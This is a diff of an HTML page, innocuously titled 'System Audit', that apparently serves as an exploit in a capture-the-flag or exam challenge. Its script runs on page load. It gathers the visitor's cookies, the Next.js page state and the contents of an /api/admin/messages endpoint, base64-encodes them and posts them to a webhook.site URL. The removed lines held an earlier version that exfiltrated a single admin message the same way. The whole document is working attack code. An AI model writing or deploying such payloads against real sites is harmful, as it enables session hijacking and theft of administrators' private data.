@@ -1,25 +1,36 @@
 <!DOCTYPE html>
 <html>
+<head><title>System Audit</title></head>
 <body>
     <script>
-        // Use the successful path and your NEW message ID
-        const targetPath = '/api/admin/messages/69ea9db1bee6d6b7c6646616';
-        const myWebhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
+        const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
 
-        fetch(targetPath)
-            .then(response => response.text())
-            .then(data => {
-                // Send the result to your new webhook
-                fetch(myWebhook, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: btoa('EXAM_FLAG_RESULT:' + data)
-                });
-            })
-            .catch(err => {
-                // Log if the admin can't reach the API from your link
-                new Image().src = myWebhook + '?error=' + btoa(err.message);
+        async function deepScan() {
+            let results = {};
+
+            // 1. Grab Next.js Internal State (Common for Flags in React apps)
+            try {
+                results.nextData = window.__NEXT_DATA__ || "Not Found";
+            } catch(e) {}
+
+            // 2. Grab Cookies
+            results.cookies = document.cookie;
+
+            // 3. Fetch the actual Inbox API (Targeting the list, not an ID)
+            try {
+                const response = await fetch('/api/admin/messages');
+                results.apiInbox = await response.text();
+            } catch(e) { results.apiError = e.message; }
+
+            // Exfiltrate everything
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: btoa(JSON.stringify(results))
             });
+        }
+
+        deepScan();
     </script>
 </body>
 </html>
